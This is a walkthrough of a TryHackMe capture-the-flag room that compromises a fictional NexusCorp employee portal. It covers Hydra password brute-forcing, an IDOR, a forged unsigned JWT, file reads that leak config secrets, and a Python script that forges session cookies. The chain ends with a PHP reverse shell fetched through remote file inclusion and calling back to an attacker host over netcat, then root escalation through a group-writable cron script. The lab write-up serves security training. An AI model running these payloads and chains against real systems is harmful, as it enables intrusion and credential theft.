# [Domino](https://tryhackme.com/room/domino)

## Chain together vulnerabilities in a cascading attack, where every piece you find knocks over the next.

# Challenge

The NexusCorp Employee Portal appears to be a typical internal application with authentication controls and role-based access in place. However, multiple small weaknesses, ranging from misconfigurations to logic flaws, can be combined to fully compromise the system.

As an attacker, your objective is to observe how the application behaves, interact with its endpoints, and identify weak trust boundaries. By analysing requests, modifying parameters, and chaining vulnerabilities together, you can progressively escalate your access and move deeper into the system.

_A single misstep can trigger a chain reaction, exploit each weakness in sequence and watch the system fall, one domino at a time._

### What is the flag found in the admin user's profile notes?

1. Initial recon - port scan

Start with a full TCP port scan with service/version detection and default script scanning to get a picture of the attack surface:

```bash
nmap -p- -sVC <TARGET_IP>
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 68:f0:b5:03:b5:49:aa:1d:1d:b5:5e:3f:34:09:92:d3 (ECDSA)
|_  256 12:b2:ca:bf:96:48:0f:61:23:61:24:98:97:c3:d4:07 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: NexusCorp Portal
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Enumerating the web application - username disclosure

Browsing the site turns up a `/team.php` page that lists company staff. Presumably intended as a normal "meet the team" marketing page, but it doubles as a leak of valid usernames in `firstname.lastname` format, which conveniently matches the login form's placeholder text.

```
laura.hayes
michael.chen
sarah.johnson
robert.wilson
emma.taylor
david.brown
james.wright
```

These seven names are saved into a `users.txt` file to be used as a login wordlist.

3. Credential brute-forcing

With a confirmed list of valid usernames and a standard login form, the next logical step is a password-spraying/brute-force attack against the login form using `rockyou.txt`. The form returns the string `invalid` in the response body when a login attempt fails, which is used as the failure condition for Hydra's HTTP POST form module:

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/index.php:username=^USER^&password=^PASS^:F=invalid" -t 4 -v
```

**Results:**

```
[80][http-post-form] host: <TARGET_IP>   login: laura.hayes
[80][http-post-form] host: <TARGET_IP>   login: michael.chen
[80][http-post-form] host: <TARGET_IP>   login: sarah.johnson   password: password
[80][http-post-form] host: <TARGET_IP>   login: robert.wilson   password: password
[80][http-post-form] host: <TARGET_IP>   login: emma.taylor   password: password
[80][http-post-form] host: <TARGET_IP>   login: david.brown
[80][http-post-form] host: <TARGET_IP>   login: james.wright
```

Three accounts: `sarah.johnson`, `robert.wilson`, and `emma.taylor`. All use the trivially weak password `password`. The remaining four accounts don't crack against `rockyou.txt` within this run, meaning they likely use stronger or non-dictionary passwords. Having any valid low-privilege credentials is enough to keep moving, so we proceed with `sarah.johnson:password`.

4. Broken Object Level Authorization (IDOR) on the profile API

Logging in as `sarah.johnson` lands us on `http://<TARGET_IP>/dashboard.php`, an internal portal landing page. On the dashboard there's a "**My Profile API**" button/link that calls back to: `http://<TARGET_IP>/api/users/profile.php?id=3`.

The `id` parameter is simply the authenticated user's database ID, and the endpoint does not verify that the requesting user is authorized to view the requested id. By manually changing the id parameter, we can pull any user's profile record, including notes fields that were never meant to be publicly viewable.

Walking the ID space quickly reveals that `id=1` belongs to the admin account, and the admin's profile notes field contains the first flag.

<img width="745" height="234" alt="SCREEN01" src="https://github.com/user-attachments/assets/7776497e-677f-463b-87f4-f28903c11dd0" />

---

### What is the flag displayed on the admin panel after gaining admin access?

1. Weak JWT issuance

The portal also exposes a JWT-based API authentication flow at: `http://<TARGET_IP>/api/auth/token.php`.

Visiting this endpoint issues a JWT of the form `header.payload.signature`, intended to authorize calls to other `/api/*.php` endpoints via an `Authorization: Bearer <token>` header.

2. Decoding and tampering with the token

JWTs are just base64url-encoded JSON with a signature appended - no encryption. Pasting the middle segment into [CyberChef](https://gchq.github.io/CyberChef/) and running a **From Base64** recipe reveals the payload structure:

```json
{
  "sub": "sarah.johnson",
  "role": "user",
  "iat": 1785100686,
  "exp": 1785104286
}
```

3. Forging an admin JWT

Because we don't yet know `JWT_SECRET`, we can't produce a valid signature the normal way. We craft a new payload with `"role": "admin"` instead of `"user"`, base64-encode it, and reattach it to the original header and _any_ signature value. This works because, as later confirmed by reading `auth.php`, the server-side `verify_jwt()` function has signature verification commented out entirely. It accepts any payload regardless of whether the signature matches:

```php
function verify_jwt($token) {
    $parts = explode('.', $token);
    if (count($parts) !== 3) return null;
    $payload = json_decode(base64_decode($parts[1]), true);
    if (!$payload) return null;
    // Signature check intentionally disabled
    // $expected = rtrim(base64_encode(hash_hmac('sha256', "$parts[0].$parts[1]", JWT_SECRET, true)),'=');
    // if (!hash_equals($parts[2], $expected)) return null;
    if (isset($payload['exp']) && $payload['exp'] < time()) return null;
    return $payload;
}
```

This is a **broken authentication / missing signature verification** flaw. The JWT is essentially decorative. Any client can mint a token claiming to be `role: admin` for any subject, with any expiry they like, and the server will trust it.

4. Abusing the forged admin JWT against a vulnerable file-read API

Armed with an "admin" JWT, we discover `/api/files.php?name=<path>`, an endpoint gated by `require admin role` that reads arbitrary files from disk. Using our forged token we pull the application's own source code to understand the rest of the auth chain:

**index.php** - the login page and cookie-issuing logic:

```bash
curl 'http://<TARGET_IP>/api/files.php?name=/var/www/html/index.php' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzg1MTAwNjg2LCJleHAiOjE3ODUxMDQyODZ9==.oiD4ifBc9oCCFrM/xazdOjAEav3HYdbSfrOYojs9jTk'
```

```json
{
  "file": "\/var\/www\/html\/index.php",
  "content": "<?php\nrequire_once __DIR__ . '\/auth.php';\n$user = get_session();\nif ($user) { header('Location: \/dashboard.php'); exit; }\n$error = '';\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $username = trim($_POST['username'] ?? '');\n    $password = $_POST['password'] ?? '';\n    if ($username && $password) {\n        $db = get_db();\n        $stmt = $db->prepare('SELECT id, username, email, role, password_hash FROM users WHERE username = ?');\n        $stmt->execute([$username]);\n        $row = $stmt->fetch(PDO::FETCH_ASSOC);\n        if ($row && password_verify($password, $row['password_hash'])) {\n            $cookie_data = base64_encode(json_encode(['user_id' => $row['id'], 'username' => $row['username'], 'role' => $row['role']]));\n            $sig = hash_hmac('sha256', $cookie_data, APP_SECRET);\n            setcookie('nexus_session', $cookie_data . '.' . $sig, 0, '\/', '', false, false);\n            header('Location: \/dashboard.php');\n            exit;\n        } else {\n            $error = 'Invalid credentials';\n        }\n    }\n}\n?>\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n<title>NexusCorp Portal<\/title>\n<link rel=\"stylesheet\" href=\"\/static\/style.css\">\n<\/head>\n<body class=\"login-page\">\n<div class=\"login-box\">\n  <div class=\"logo\"><span class=\"logo-icon\">&#9650;<\/span> NexusCorp<\/div>\n  <h2>Employee Portal<\/h2>\n  <?php if ($error): ?><div class=\"alert alert-danger\"><?= htmlspecialchars($error) ?><\/div><?php endif; ?>\n  <form method=\"POST\" action=\"\/index.php\">\n    <div class=\"form-group\">\n      <label>Username<\/label>\n      <input type=\"text\" name=\"username\" placeholder=\"firstname.lastname\" required>\n    <\/div>\n    <div class=\"form-group\">\n      <label>Password<\/label>\n      <input type=\"password\" name=\"password\" placeholder=\"Password\" required>\n    <\/div>\n    <button type=\"submit\" class=\"btn-primary\">Sign In<\/button>\n  <\/form>\n  <div class=\"links\">\n    <a href=\"\/forgot.php\">Forgot password?<\/a> - <a href=\"\/team.php\">Our Team<\/a> \n  <\/div>\n<\/div>\n<\/body>\n<\/html>\n"
}
```

This shows the session cookie `nexus_session` is `base64(json).hmac_sha256(base64(json), APP_SECRET)` - HMAC-signed, unlike the JWT.

**auth.php:** - the session validation and JWT generation/verification logic:

```bash
curl 'http://<TARGET_IP>/api/files.php?name=/var/www/html/auth.php' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzg1MTAwNjg2LCJleHAiOjE3ODUxMDQyODZ9==.oiD4ifBc9oCCFrM/xazdOjAEav3HYdbSfrOYojs9jTk'
```

```json
{
  "file": "\/var\/www\/html\/auth.php",
  "content": "<?php\nrequire_once __DIR__ . '\/config.php';\n\nfunction get_session() {\n    if (!isset($_COOKIE['nexus_session'])) return null;\n    $raw = $_COOKIE['nexus_session'];\n    \/\/ Cookie format: base64(json).hmac_sha256(base64(json), APP_SECRET)\n    $parts = explode('.', $raw, 2);\n    if (count($parts) !== 2) return null;\n    $expected_sig = hash_hmac('sha256', $parts[0], APP_SECRET);\n    if (!hash_equals($expected_sig, $parts[1])) return null;\n    $decoded = base64_decode($parts[0]);\n    $data = json_decode($decoded, true);\n    if (!$data || !isset($data['user_id'])) return null;\n    \/\/ Role always fetched from DB - cookie role value ignored\n    $db = get_db();\n    $stmt = $db->prepare('SELECT id, username, email, role FROM users WHERE id = ?');\n    $stmt->execute([$data['user_id']]);\n    return $stmt->fetch(PDO::FETCH_ASSOC);\n}\n\nfunction require_login() {\n    $user = get_session();\n    if (!$user) { header('Location: \/index.php'); exit; }\n    return $user;\n}\n\nfunction require_admin() {\n    $user = require_login();\n    if ($user['role'] !== 'admin') {\n        http_response_code(403);\n        header('Content-Type: application\/json');\n        echo json_encode(['error' => 'Forbidden']);\n        exit;\n    }\n    return $user;\n}\n\nfunction generate_jwt($username) {\n    $header = rtrim(base64_encode(json_encode(['alg'=>'HS256','typ'=>'JWT'])), '=');\n    \/\/ Bug: role always set to \"user\" regardless of actual user role\n    $payload = rtrim(base64_encode(json_encode([\n        'sub' => $username,\n        'role' => 'user',\n        'iat' => time(),\n        'exp' => time() + 3600\n    ])), '=');\n    $sig = rtrim(base64_encode(hash_hmac('sha256', \"$header.$payload\", JWT_SECRET, true)), '=');\n    return \"$header.$payload.$sig\";\n}\n\nfunction verify_jwt($token) {\n    $parts = explode('.', $token);\n    if (count($parts) !== 3) return null;\n    $payload = json_decode(base64_decode($parts[1]), true);\n    if (!$payload) return null;\n    \/\/ Signature check intentionally disabled\n    \/\/ $expected = rtrim(base64_encode(hash_hmac('sha256', \"$parts[0].$parts[1]\", JWT_SECRET, true)),'=');\n    \/\/ if (!hash_equals($parts[2], $expected)) return null;\n    if (isset($payload['exp']) && $payload['exp'] < time()) return null;\n    return $payload;\n}\n?>\n"
}
```

Importantly, `get_session()` re-fetches the user's `role` from the database by `user_id`. It does _not_ trust whatever `role` value is embedded in the cookie. So we can't just stuff `role: admin` into the cookie JSON; instead we need to forge a cookie for `user_id => 1` with a valid HMAC signature, which requires knowing `APP_SECRET`.

**config.php** - and here's the secret we need:

```bash
curl 'http://<TARGET_IP>/api/files.php?name=/var/www/html/config.php' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzg1MTAwNjg2LCJleHAiOjE3ODUxMDQyODZ9==.oiD4ifBc9oCCFrM/xazdOjAEav3HYdbSfrOYojs9jTk'
```

```json
{
  "file": "\/var\/www\/html\/config.php",
  "content": "<?php\ndefine('DB_HOST', 'localhost');\ndefine('DB_NAME', 'nexusdb');\ndefine('DB_USER', 'app_user');\ndefine('DB_PASS', 'D3v0ps!2024');\ndefine('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');\ndefine('APP_SECRET', 'nexus_app_k3y_2024');\n\nfunction get_db() {\n    $pdo = new PDO('mysql:host='.DB_HOST.';dbname='.DB_NAME, DB_USER, DB_PASS);\n    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n    return $pdo;\n}\n?>\n"
}
```

Now we have `APP_SECRET`, the HMAC key used to sign the `nexus_session` cookie. A plaintext credential leak straight from a config file that should never have been reachable, made possible entirely by chaining the previous two bugs.

5. Forging a valid, HMAC-signed session cookie for the real admin account

With `APP_SECRET` known, we can construct a legitimate `nexus_session` cookie for `user_id = 1` entirely offline:

```py
import base64
import hmac
import hashlib
import json

SECRET_KEY = b"nexus_app_k3y_2024"
user_payload = {
    "user_id": 1,
    "username": "laura.hayes",
    "role": "admin"
}

json_str = json.dumps(user_payload, separators=(',', ':'))
base64_payload = base64.b64encode(json_str.encode()).decode()
signature = hmac.new(SECRET_KEY, base64_payload.encode(), hashlib.sha256).hexdigest()
forged_cookie = f"{base64_payload}.{signature}"

print(forged_cookie)
```

Note that `role` in the cookie JSON is cosmetic/ignored, but `user_id = 1` is what actually matters, since it's used to look the real role up from the database and user `1` genuinely is an admin, so this produces a fully legitimate, correctly-signed session.

6. Using the forged cookie

Replace the browser's `nexus_session` cookie value with the freshly generated `forged_cookie` string and refresh the page. The server validates the HMAC, looks up `user_id=1`, confirms `role = admin` from the database, and grants full admin access: `http://<TARGET_IP>/admin/index.php`. The admin panel displays the second flag.

<img width="953" height="699" alt="SCREEN02" src="https://github.com/user-attachments/assets/00702b42-7794-4913-b1e3-b59ac3773ecb" />

---

### What is the flag obtained after achieving remote code execution on the server? Flag is stored in `/opt/flag3.txt`

1. Reading` files.php`'s own source to find the RFI

Having admin-level access to the arbitrary file-read endpoint, it's worth reading the endpoint's own source code to see if it has further weaknesses beyond the ones already used:

```bash
curl 'http://<TARGET_IP>/api/files.php?name=/var/www/html/api/files.php' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzg1MTAwNjg2LCJleHAiOjE3ODUxMDQyODZ9==.oiD4ifBc9oCCFrM/xazdOjAEav3HYdbSfrOYojs9jTk'
```

```json
{
  "file": "\/var\/www\/html\/api\/files.php",
  "content": "<?php\nrequire_once __DIR__ . \"\/..\/auth.php\";\nheader(\"Content-Type: application\/json\");\n\n$jwt_payload = null;\nif (isset($_SERVER[\"HTTP_AUTHORIZATION\"])) {\n    $auth = $_SERVER[\"HTTP_AUTHORIZATION\"];\n    if (strpos($auth, \"Bearer \") === 0) {\n        $jwt_payload = verify_jwt(substr($auth, 7));\n    }\n}\n\nif (!$jwt_payload) {\n    http_response_code(401);\n    echo json_encode([\"error\" => \"JWT token required. Get one from \/api\/auth\/token.php\"]);\n    exit;\n}\n\nif (($jwt_payload[\"role\"] ?? \"\") !== \"admin\") {\n    http_response_code(403);\n    echo json_encode([\"error\" => \"Admin JWT required. Check your token payload.\"]);\n    exit;\n}\n\n$name = $_GET[\"name\"] ?? \"\";\nif (!$name) {\n    http_response_code(400);\n    echo json_encode([\"error\" => \"Missing name parameter\", \"usage\" => \"\/api\/files.php?name=\/var\/www\/html\/filename.txt\"]);\n    exit;\n}\n\n\/\/ RFI: fetch remote URL and eval as PHP (allow_url_fopen enabled)\nif (strpos($name, \"http:\/\/\") === 0 || strpos($name, \"https:\/\/\") === 0) {\n    $remote = @file_get_contents($name);\n    if ($remote === false) {\n        http_response_code(502);\n        echo json_encode([\"error\" => \"Could not fetch remote file\"]);\n        exit;\n    }\n    ob_start();\n    eval(str_replace(\"<?php\", \"\", $remote));\n    $output = ob_get_clean();\n    echo json_encode([\"output\" => $output]);\n    exit;\n}\n\n\/\/ Security check: resolve real path to prevent ..\/ traversal\n$real = realpath($name);\nif ($real === false || strpos($real, '\/var\/www\/html\/') !== 0) {\n    http_response_code(403);\n    echo json_encode([\"error\" => \"Access denied: path must be within \/var\/www\/html\/\"]);\n    exit;\n}\n\nif (!file_exists($real)) {\n    http_response_code(404);\n    echo json_encode([\"error\" => \"File not found: \" . $real]);\n    exit;\n}\n\n$content = file_get_contents($real);\necho json_encode([\"file\" => $real, \"content\" => $content]);\n"
}
```

This is the fourth and most severe bug in the chain: if the `name` parameter starts with `http://` or `https://`, the endpoint fetches that URL's content and directly `eval()`s it as PHP. The `realpath()`/directory-traversal protection further down never even gets reached in this branch, since PHP filesystem functions like `realpath()` don't apply to remote URLs. The developer added a path-traversal fix for local files but left a much bigger hole for remote ones.

2. Standing up infrastructure to serve the payload

On our attacking machine, host a simple web server in the directory containing our malicious PHP file so the target can fetch it:

```bash
python3 -m http.server
```

3. Setting up a reverse-shell listener

In a separate terminal, start a `netcat` listener to catch the reverse shell once the payload executes on the target:

```bash
nc -lvnp 4444
```

4. Building the reverse-shell payload

Create `shell.php` - plain PHP that opens a TCP connection back to us and spawns an interactive shell over it:

```php
<?php
$ip = '<ATTACKER_IP>';
$port = 4444;

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```

5. Triggering the RFI

With both the HTTP server and the `nc` listener running, request `files.php` on the target, pointing `name` at our hosted `shell.php`:

```bash
curl 'http://<TARGET_IP>/api/files.php?name=http://<ATTACKER_IP>:8000/shell.php' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc4NTE1ODk2NSwiZXhwIjoxNzg1MTYyNTY1fQ==.nmoKJPylkvFirHKI7DFyi1EGFJOD95xjlzdo0qLWtqw'
```

The target server fetches our PHP file over HTTP and `eval()`s it server-side, causing it to connect back to our listener. Our `nc` session catches an interactive shell running as the web server user.

6. Reading the RCE flag

```bash
cat /opt/flag3.txt
```

<img width="556" height="154" alt="SCREEN03" src="https://github.com/user-attachments/assets/5112a232-21e7-4ca4-a6bc-448dee25a134" />

---

### What is the flag found in the **devops** user's home directory?

1. Stabilizing the shell and pivoting to the **`devops`** user

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

We already recovered a password during the source-code disclosure step. `config.php` revealed `DB_PASS = 'D3v0ps!2024'`, a database password that turns out to be reused as a local Linux account password for a user named `devops`. Switch users:

```bash
su devops
# Password: D3v0ps!2024
```

2. Reading the user flag

```bash
ls -la /home/devops
cat /home/devops/user.txt
```

<img width="563" height="207" alt="SCREEN04" src="https://github.com/user-attachments/assets/95eb3721-079d-43f3-a525-437e94974716" />

---

### What is the root flag?

1. Looking for privilege escalation vectors as **`devops`**

A quick look around commonly-writable/monitoring directories turns up an interesting script owned by `root` but _group-writable_ by `devops`:

```bash
ls -lah /opt/monitoring
```

**Results:**

```
total 12K
drwxr-xr-x 2 root root   4.0K Apr 29 10:27 .
drwxrwxrwx 5 root root   4.0K May  7 20:26 ..
-rwxrwxr-- 1 root devops  537 May 18 10:41 health_report.sh
```

`health_report.sh` is owned by `root:devops` with permissions `-rwxrwxr--`. The group has both read and write access. This script is executed periodically by root, any code we append to it will run with root privileges the next time it fires.

2. Weaponizing the writable root-owned script

Append a command that sets the SUID bit on `/bin/bash`, which will let any user spawn a root-owned shell:

```bash
echo 'chmod +s /bin/bash' >> /opt/monitoring/health_report.sh
```

After waiting for the scheduled/cron execution of `health_report.sh` to run as root, confirm the SUID bit was applied:

```bash
ls -lah /bin/bash
```

Then invoke bash with the `-p` flag to preserve the elevated privileges granted by the SUID bit:

```bash
bash -p
```

This drops us into a root-privileged shell.

3. Reading the root flag

```bash
ls /root
cat /root/root.txt
```

<img width="834" height="311" alt="SCREEN05" src="https://github.com/user-attachments/assets/63c2b799-7d4c-4338-ab68-d46767882d57" />
